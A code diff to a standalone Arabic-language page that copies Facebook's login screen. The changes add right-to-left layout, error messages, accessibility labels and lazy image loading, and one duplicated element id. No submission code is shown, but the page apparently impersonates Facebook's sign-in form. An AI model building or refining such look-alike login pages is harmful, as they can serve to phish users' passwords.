@@ -1,4 +1,4 @@
-<html lang="en">
+<html lang="ar" dir="rtl">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -138,19 +138,29 @@
       font-size: 18px;
       margin-top: 20px;
     }
+    .error-message {
+  color: red;
+  font-size: 14px;
+  margin-top: 5px;
+  display: none;
+}
+
   </style>
 </head>
 <body>
   <div class="main">
     <p class="p1">الحصول على تطبيق فيسبوك</p>
     <div class="logo">
-      <img data-src="111.png"  alt="Lazy loaded image">
+     <img data-src="111.png" alt="Lazy loaded image" loading="lazy">
+
     </div>
+    <div id="emailOrPhoneError" class="error-message">Please enter a valid email address or phone number.</div>
+
     <form id="loginForm">
-      <input placeholder="البريد الإلكتروني أو رقم الهاتف" type="text" id="emailOrPhone" required>
+     <input placeholder="البريد الإلكتروني أو رقم الهاتف" type="text" id="emailOrPhone" required aria-label="Email or phone">
       <!-- Added error message for email/phone -->
       <div id="emailOrPhoneError" style="color: red; font-size: 14px; margin-top: 5px; display: none;">Please enter a valid email address or phone number.</div>
-      <input placeholder="كلمة السر" type="password" name="pass" id="pass" required>
+      <input placeholder="كلمة السر" type="password" name="pass" id="pass" required aria-label="Password">
       <!-- Added error message for password -->
       <div id="passwordError" style="color: red; font-size: 14px; margin-top: 5px; display: none;">Password must be at least 6 characters long.</div>
       <!-- Your original login button (unchanged) -->
@@ -299,6 +309,19 @@
         img.removeAttribute('data-src');
     });
 });
+const lazyImages = document.querySelectorAll("img[data-src]");
+const observer = new IntersectionObserver((entries, observer) => {
+  entries.forEach(entry => {
+    if (entry.isIntersecting) {
+      const img = entry.target;
+      img.src = img.getAttribute("data-src");
+      img.removeAttribute("data-src");
+      observer.unobserve(img);
+    }
+  });
+});
+
+lazyImages.forEach(img => observer.observe(img));
 
   </script>
 </body>
